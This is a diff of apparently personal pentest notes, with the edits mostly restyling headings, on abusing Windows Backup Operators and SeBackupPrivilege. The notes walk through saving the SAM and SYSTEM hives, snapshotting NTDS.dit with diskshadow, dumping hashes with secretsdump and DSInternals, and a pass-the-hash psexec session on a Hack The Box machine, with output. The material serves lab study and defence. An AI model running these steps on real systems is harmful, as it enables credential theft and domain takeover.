@@ -1,7 +1,7 @@
-# Windows Built-in Groups
+# <span style="color:#FF5555">Windows Built-in Groups</span>
 
 
-## 🏢 Windows Built-in Groups
+## <span style="color:#8BE9FD">🏢 Windows Built-in Groups</span>
 
 - Windows servers and Domain Controllers have **built-in groups** that grant special rights.
 - These groups exist from Server 2008 R2 onward (except Hyper-V Admins from Server 2012).
@@ -10,7 +10,7 @@
 - Always check group membership to identify possible privilege escalation paths.
 
 
-### Important Groups to Know:
+### <span style="color:#50FA7B">Important Groups to Know:</span>
 - **Backup Operators**
 - Event Log Readers
 - DnsAdmins
@@ -19,7 +19,7 @@
 - Server Operators
 
 
-## 💼 Backup Operators Group & SeBackupPrivilege
+## <span style="color:#8BE9FD">💼 Backup Operators Group & SeBackupPrivilege</span>
 
 - Being in **Backup Operators** gives two key privileges:
   - **SeBackupPrivilege**: Backup files/folders (read anything).
@@ -28,10 +28,10 @@
 - **SeBackupPrivilege** lets you read and copy files **even if ACL denies access**.
 
 
-## 🧪 Using SeBackupPrivilege to Copy Protected Files
+## <span style="color:#8BE9FD">🧪 Using SeBackupPrivilege to Copy Protected Files</span>
 
 
-### Step 1: Check Your Group Membership
+### <span style="color:#50FA7B">Step 1: Check Your Group Membership</span>
 
 ```powershell
 whoami /groups
@@ -40,7 +40,7 @@ whoami /groups
 Look for membership in **Backup Operators**.
 
 
-### Step 2: Check if SeBackupPrivilege is Enabled
+### <span style="color:#50FA7B">Step 2: Check if SeBackupPrivilege is Enabled</span>
 
 ```powershell
 whoami /priv
@@ -57,7 +57,7 @@ Get-SeBackupPrivilege
 *Note:* You may need an **elevated (admin) command prompt**.
 
 
-### Step 3: Copy a Protected File Using SeBackupPrivilege Cmdlet
+### <span style="color:#50FA7B">Step 3: Copy a Protected File Using SeBackupPrivilege Cmdlet</span>
 
 Example: The file `C:\Confidential\2021 Contract.txt` is denied for normal reading.
 
@@ -70,11 +70,11 @@ cat .\Contract.txt
 # File content is now readable
 ```
 
-## OR  copy using robocopy
+## <span style="color:#8BE9FD">OR  copy using robocopy</span>
 ```
 robocopy "C:\Users\Administrator\Desktop" "C:\Temp" "root.txt" /B
 ```
-# Window Registery (Administrator hash)
+# <span style="color:#FF5555">Window Registery (Administrator hash)</span>
 SeBackupPrivilege is an instant win. We can copy the sam and system registry values and pass the Administrator hash.
 ```bash
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> reg save hklm\system C:\temp\system.hive 
@@ -115,14 +115,14 @@ Thanks to windows and it's silliness, I can just pass the administrator hash usi
 
 ```
 ┌──(kali㉿kali)-[~/…/htb/writeups/cicada/loot]
-└─$ impacket-psexec cicada.htb/Administrator@10.129.198.41 -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
+└─$ impacket-psexec cicada.htb/Administrator@$VICTIM_IP -hashes 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Requesting shares on 10.129.198.41.....
+[*] Requesting shares on $VICTIM_IP.....
 [*] Found writable share ADMIN$
 [*] Uploading file DgNSqBjx.exe
-[*] Opening SVCManager on 10.129.198.41.....
-[*] Creating service RURf on 10.129.198.41.....
+[*] Opening SVCManager on $VICTIM_IP.....
+[*] Creating service RURf on $VICTIM_IP.....
 [*] Starting service RURf.....
 [!] Press help for extra shell commands
 Microsoft Windows [Version 10.0.20348.2700]
@@ -134,16 +134,16 @@ C:\Windows\system32>
 
 
 ___
-# Attacking a Domain Controller with SeBackupPrivilege
+# <span style="color:#FF5555">Attacking a Domain Controller with SeBackupPrivilege</span>
 
 
-### Why Target the Domain Controller?
+### <span style="color:#50FA7B">Why Target the Domain Controller?</span>
 
 - The **NTDS.dit** file contains the Active Directory database with all user and computer hashes.
 - It is **locked** and inaccessible normally.
 
 
-### Step 1: Create a Shadow Copy with DiskShadow
+### <span style="color:#50FA7B">Step 1: Create a Shadow Copy with DiskShadow</span>
 
 ```powershell
 diskshadow.exe
@@ -164,14 +164,14 @@ exit
 Now `E:` is a snapshot of the `C:` drive, including the NTDS.dit file.
 
 
-### Step 2: Copy NTDS.dit Locally Using SeBackupPrivilege
+### <span style="color:#50FA7B">Step 2: Copy NTDS.dit Locally Using SeBackupPrivilege</span>
 
 ```powershell
 Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
 
-### Step 3: Back Up SAM and SYSTEM Registry Hives
+### <span style="color:#50FA7B">Step 3: Back Up SAM and SYSTEM Registry Hives</span>
 
 ```powershell
 reg save HKLM\SYSTEM SYSTEM.SAV
@@ -181,11 +181,11 @@ reg save HKLM\SAM SAM.SAV
 These files can be used to extract local account credentials offline.
 
 
-## 🔍 Extracting Credentials
+## <span style="color:#8BE9FD">🔍 Extracting Credentials</span>
 
 - Use tools like **DSInternals PowerShell** or **Impacket secretsdump.py**.
 
-### DSInternals example:
+### <span style="color:#50FA7B">DSInternals example:</span>
 
 ```powershell
 Import-Module .\DSInternals.psd1
@@ -194,7 +194,7 @@ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=domain,DC=local
 ```
 
 
-### secretsdump.py example:
+### <span style="color:#50FA7B">secretsdump.py example:</span>
 
 ```bash
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
@@ -203,7 +203,7 @@ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 This extracts NTLM hashes which can be cracked offline or used in pass-the-hash attacks.
 
 
-## 🛠 Using Robocopy in Backup Mode
+## <span style="color:#8BE9FD">🛠 Using Robocopy in Backup Mode</span>
 
 Instead of external tools, use **robocopy** with the `/B` (backup mode) flag to copy locked files.
 
